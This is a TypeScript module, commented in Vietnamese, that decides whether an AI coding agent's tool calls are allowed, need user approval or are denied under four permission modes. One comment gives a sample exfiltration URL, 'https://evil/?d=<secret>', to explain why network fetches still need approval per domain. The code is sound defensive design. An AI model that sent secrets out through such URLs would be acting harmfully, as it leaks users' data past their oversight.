/**
 * Chính sách quyền: một công cụ được chạy luôn, phải hỏi người dùng, hay bị từ chối — tuỳ chế độ quyền.
 *
 *   default      hỏi trước khi sửa tệp / chạy lệnh / đọc ngoài workspace / vào tên miền mới
 *   acceptEdits  tự nhận sửa/tạo tệp trong workspace; vẫn hỏi khi chạy lệnh và khi vào tên miền web mới
 *   plan         chỉ đọc và nghiên cứu; trình kế hoạch để duyệt
 *   bypass       không hỏi gì
 */

import type { PermissionMode } from '../../shared/protocol';
import { isPlanSafe } from './toolRegistry';
import type { PermissionNeed, SessionState, ToolContext, ToolDef } from './types';

export type Verdict =
  | { action: 'allow' }
  | { action: 'ask'; need: PermissionNeed }
  | { action: 'deny'; reason: 'plan_mode' };

export async function decidePermission(
  def: ToolDef,
  input: unknown,
  ctx: ToolContext,
  mode: PermissionMode,
): Promise<Verdict> {
  if (mode === 'plan' && !isPlanSafe(def) && def.onlyInMode !== 'plan') {
    return { action: 'deny', reason: 'plan_mode' };
  }

  const need = (await def.permission?.(input, ctx)) ?? null;
  if (!need) return { action: 'allow' };

  // Duyệt kế hoạch luôn cần người dùng, kể cả khi bypass? Bypass nghĩa là không hỏi gì → cho qua.
  if (mode === 'bypass') return { action: 'allow' };
  if (need.kind === 'plan') return { action: 'ask', need };

  if (!need.elevated) {
    if (need.sessionKey && ctx.session.approvals.includes(need.sessionKey)) return { action: 'allow' };
    // Chỉ chỉnh sửa/tạo tệp được tự nhận. Ra mạng (fetch_url) vẫn hỏi theo từng tên miền: URL có thể mang dữ liệu
    // đi (`https://evil/?d=<bí mật>`), nên "tự nhận chỉnh sửa" không được hiểu là "tự cho phép gửi dữ liệu ra ngoài".
    if (mode === 'acceptEdits' && (need.kind === 'edit' || need.kind === 'create' || (need.kind === 'browser' && need.autoInAcceptEdits))) {
      return { action: 'allow' };
    }
  }
  return { action: 'ask', need };
}

export function rememberApproval(session: SessionState, key: string | undefined): void {
  if (key && !session.approvals.includes(key)) session.approvals.push(key);
}
